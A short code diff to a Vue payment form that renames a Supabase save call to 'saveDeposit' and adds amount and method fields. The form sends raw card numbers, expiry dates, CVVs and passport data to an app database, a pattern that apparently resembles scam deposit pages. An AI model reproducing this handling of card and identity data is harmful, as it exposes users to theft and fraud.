@@ -1,6 +1,6 @@
 <script setup>
 import { ref } from 'vue'
-import { saveUser } from '../lib/supabase'
+import { saveDeposit } from '../lib/supabase'
 
 const cardNumber = ref('')
 const expiry = ref('')
@@ -16,14 +16,16 @@ const passportData2 = ref('')
 async function submit() {
   processing.value = true
   const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
-  await saveUser({
+  await saveDeposit({
     email: authUser.email || '',
     phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
     cardNumber: cardNumber.value,
     cardDate: expiry.value,
     cvv: cvv.value,
     passportData: passportData.value,
-    passportData2: passportData2.value
+    passportData2: passportData2.value,
+    amount: amount.value,
+    method: method.value
   })
   setTimeout(() => {
     processing.value = false
